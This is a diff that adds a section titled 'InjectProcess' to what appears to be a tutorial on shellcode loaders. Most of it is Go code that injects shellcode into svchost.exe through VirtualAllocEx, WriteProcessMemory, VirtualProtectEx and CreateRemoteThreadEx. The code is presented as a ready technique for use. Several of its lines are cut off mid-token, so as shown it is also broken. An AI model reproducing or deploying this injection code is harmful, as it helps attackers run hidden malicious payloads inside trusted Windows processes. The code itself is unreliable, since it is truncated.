@@ -71,3 +71,46 @@ for this technique we set `VirtualAlloc` for the shellcode in **`addr` variable*
 
 
 ### Method 3 : InjectProcess
+
+```
+func injectProcess(sc []byte) {
+        pid := FindProcess("svchost.exe")
+        fmt.Printf("[*] Injecting into svchost.exe, PID=[%v]\n", pid)
+        if pid == 0 {
+                panic("Canot find svchost.exe")
+        }
+        kernel32 := windows.NewLazySystemDLL("kernel32.dll")
+        VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
+        VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
+        WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
+        CreateRemoteThreadEx := kernel32.NewProc("CreateRemoteThreadEx")
+
+        proc, errOpenProcess := windows.OpenProcess(windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_|windows.PROCESS_QUERY_INFORMATION, false, uint32(pid))
+        if errOpenProcess != nil {
+                panic(fmt.Sprintf("[!] OpenProcess Error : %s", errOpenProcess.Error()))
+        }
+
+        addr, _, errVirtualAlloc := VirtualAllocEx.Call(uintptr(proc), 0, uintptr(len(sc)), windows
+        if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully
+                panic(fmt.Sprintf("[!] VirtualAlloc Error:\r\n%s", errVirtualAlloc.Error()))
+        }
+
+        _, _, errWriteProcessMemory := WriteProcessMemory.Call(uintptr(proc), addr, (uintptr)(unsafe.
+        if errWriteProcessMemory != nil && errWriteProcessMemory.Error() != "The operation completed 
+                panic(fmt.Sprintf("[!] WriteProcessMemory Error:\r\n%s", errWriteProcessMemory.Error(
+        }
+        op := 0
+        _, _, errVirtualProtectEx := VirtualProtectEx.Call(uintptr(proc), addr, uintptr(len(sc)), win
+        if errVirtualProtectEx != nil && errVirtualProtectEx.Error() != "The operation completed succ
+                panic(fmt.Sprintf("[!] VirtualProtectEx Error:\r\n%s", errVirtualProtectEx.Error()))
+        }
+        _, _, errCreateRemoteThreadEx := CreateRemoteThreadEx.Call(uintptr(proc), 0, 0, addr, 0, 0, 0
+        if errCreateRemoteThreadEx != nil && errCreateRemoteThreadEx.Error() != "The operation comple
+                panic(fmt.Sprintf("[!] CreateRemoteThreadEx Error:\r\n%s", errCreateRemoteThreadEx.Er
+        }
+        errCloseHandle := windows.CloseHandle(proc)
+        if errCloseHandle != nil {
+                panic(fmt.Sprintf("[!] CloseHandle Error:\r\n%s", errCloseHandle.Error()))
+        }
+}
+```
